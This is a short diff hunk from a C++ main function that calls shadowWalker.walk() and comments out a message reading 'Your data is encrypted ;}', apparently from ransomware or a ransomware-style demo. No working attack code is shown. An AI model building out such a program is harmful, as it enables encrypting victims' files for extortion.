@@ -19,7 +19,7 @@ int main(int argc, char **argv) {
     //saveKey.close();
     shadowWalker.walk();
 
-    std::cout << "Your data is encrypted ;}" << std::endl;
+    //std::cout << "Your data is encrypted ;}" << std::endl;
 
     return 0;
 }
